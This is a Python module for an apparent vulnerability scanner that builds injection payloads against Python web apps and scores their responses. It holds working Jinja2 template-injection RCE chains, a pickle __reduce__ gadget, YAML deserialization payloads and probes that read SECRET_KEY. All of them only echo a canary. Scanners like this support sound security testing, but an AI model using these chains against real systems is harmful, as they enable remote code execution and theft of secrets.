import base64
import re

from injectors.base import BaseInjector
from models.scan_config import VulnerabilityReport


class PythonInjector(BaseInjector):
    """Tests for Python-specific vulnerabilities: eval/exec injection,
    format string attacks, pickle deserialization, Flask/Django config
    leaks, Jinja2 RCE chains, and YAML deserialization."""

    name = "python"
    description = (
        "Tests for Python-specific vulnerabilities including eval/exec injection, "
        "format string attacks, pickle deserialization, Flask/Django probes, "
        "advanced Jinja2 RCE chains, and YAML deserialization"
    )

    # Canary for command execution payloads
    CANARY = "EPT_PY_9f3a7c"
    # Canary for expression evaluation: 1337 * 7331 = 9799447
    EXPR_RESULT = "9799447"

    # Patterns that indicate Python internals leaked into the response
    PYTHON_CLASS_PATTERNS = [
        r"<class\s+'",
        r"__class__",
        r"__mro__",
        r"__subclasses__",
        r"__init__",
        r"__globals__",
        r"__builtins__",
    ]

    # Framework config / secret indicators
    CONFIG_LEAK_PATTERNS = [
        r"SECRET_KEY",
        r"<Config\s",
        r"DATABASE_URI",
        r"SQLALCHEMY_DATABASE_URI",
        r"DEBUG\s*[=:]\s*True",
        r"request\.environ",
    ]

    # Python error patterns (indicate code is being parsed/executed)
    ERROR_PATTERNS = [
        r"NameError",
        r"SyntaxError",
        r"TypeError",
        r"AttributeError",
        r"ImportError",
        r"ModuleNotFoundError",
        r"pickle\.loads",
        r"_pickle\.UnpicklingError",
        r"UnpicklingError",
        r"yaml\.constructor",
        r"yaml\.scanner",
        r"eval\(\)",
        r"exec\(\)",
        r"compile\(\)",
        r"Traceback \(most recent call last\)",
    ]

    def generate_quick_payloads(self, context: dict) -> list[str]:
        return [
            f"__import__('os').popen('echo {self.CANARY}').read()",
            "{0.__class__.__mro__}",
            "{{config.SECRET_KEY}}",
            "{{''.__class__.__mro__[1].__subclasses__()}}",
        ]

    def generate_payloads(self, context: dict) -> list[str]:
        # Build a pickle payload that echoes the canary via os.popen
        pickle_payload = self._make_pickle_payload()

        return [
            # ── eval/exec injection ──────────────────────────────────
            f"__import__('os').popen('echo {self.CANARY}').read()",
            "eval('1337*7331')",
            "exec('import os')",
            "compile('1337*7331','','eval')",
            "globals()",
            "__builtins__",
            "__import__('os').system('echo " + self.CANARY + "')",
            "eval(compile('1337*7331','x','eval'))",

            # ── Format string injection ──────────────────────────────
            "{0.__class__}",
            "{0.__class__.__mro__}",
            "{0.__init__.__globals__}",
            "%x%x%x%x",
            "{0.__class__.__init__.__globals__[os].popen(id).read()}",

            # ── Pickle deserialization ───────────────────────────────
            pickle_payload,

            # ── Flask / Django probes ────────────────────────────────
            "{{config}}",
            "{{config.SECRET_KEY}}",
            "{{settings.SECRET_KEY}}",
            "{{request.environ}}",
            "{{request.application.__self__._get_data_for_json.__globals__}}",
            "{{get_flashed_messages.__globals__}}",

            # ── Advanced Jinja2 RCE chains ───────────────────────────
            "{{''.__class__.__mro__[1].__subclasses__()}}",
            "{{''.__class__.__mro__[2].__subclasses__()}}",
            "{{[].__class__.__base__.__subclasses__()}}",
            "{{''.__class__.__mro__[1].__subclasses__()[408]('echo " + self.CANARY + "',shell=True,stdout=-1).communicate()}}",
            "{{config.__class__.__init__.__globals__['os'].popen('echo " + self.CANARY + "').read()}}",
            "{{lipsum.__globals__['os'].popen('echo " + self.CANARY + "').read()}}",
            "{{cycler.__init__.__globals__.os.popen('echo " + self.CANARY + "').read()}}",

            # ── YAML deserialization ─────────────────────────────────
            "!!python/object/apply:os.popen ['echo " + self.CANARY + "']",
            "!!python/object:__main__.Exploit {}",
            "!!python/object/apply:subprocess.check_output [['echo', '" + self.CANARY + "']]",
        ]

    def analyze_response(
        self, baseline: dict, test_response: dict, payload: str,
    ) -> VulnerabilityReport:
        evidence: list[str] = []
        is_vulnerable = False
        confidence = "low"

        body = test_response.get("body", "")
        baseline_body = baseline.get("body", "")
        body_lower = body.lower()
        baseline_lower = baseline_body.lower()
        test_status = test_response.get("status_code", 0)
        baseline_status = baseline.get("status_code", 0)

        # 1. Command execution canary
        if self.CANARY in body and self.CANARY not in baseline_body:
            evidence.append(f"Command execution canary found: {self.CANARY}")
            is_vulnerable = True
            confidence = "high"

        # 2. Expression evaluation result (1337*7331 = 9799447)
        if self.EXPR_RESULT in body and self.EXPR_RESULT not in baseline_body:
            evidence.append(f"Expression evaluated: 1337*7331 = {self.EXPR_RESULT}")
            is_vulnerable = True
            confidence = "high"

        # 3. Python class/object references leaked
        for pattern in self.PYTHON_CLASS_PATTERNS:
            if re.search(pattern, body) and not re.search(pattern, baseline_body):
                evidence.append(f"Python internals leaked: {pattern}")
                is_vulnerable = True
                confidence = "high"
                break  # one is enough

        # 4. Framework config / secret leaks
        for pattern in self.CONFIG_LEAK_PATTERNS:
            if re.search(pattern, body) and not re.search(pattern, baseline_body):
                evidence.append(f"Framework config leaked: {pattern}")
                is_vulnerable = True
                if confidence != "high":
                    confidence = "high"
                break

        # 5. Python error patterns (medium confidence — indicates parsing)
        for pattern in self.ERROR_PATTERNS:
            if re.search(pattern, body, re.IGNORECASE) and not re.search(pattern, baseline_lower, re.IGNORECASE):
                evidence.append(f"Python error pattern: {pattern}")
                if not is_vulnerable:
                    is_vulnerable = True
                    confidence = "medium"
                break

        # 6. Server error as low-confidence indicator
        if test_status == 500 and baseline_status != 500:
            evidence.append(f"500 error triggered (baseline was {baseline_status})")
            if not is_vulnerable:
                is_vulnerable = True
                confidence = "low"

        # Suppress false positives on 4xx rejections
        if 400 <= test_status < 500 and not evidence:
            pass

        return VulnerabilityReport(
            is_vulnerable=is_vulnerable,
            confidence=confidence,
            details="; ".join(evidence) if evidence else "No indicators found",
            evidence=evidence,
        )

    @staticmethod
    def _make_pickle_payload() -> str:
        """Build a base64-encoded pickle that triggers os.popen on deserialize."""
        # This is the standard __reduce__ gadget for pickle RCE detection.
        # pickle.loads(base64.b64decode(payload)) would execute the canary.
        import pickle
        import os

        class _Exploit:
            def __reduce__(self):
                return (os.popen, (f"echo EPT_PY_9f3a7c",))

        raw = pickle.dumps(_Exploit())
        return base64.b64encode(raw).decode()
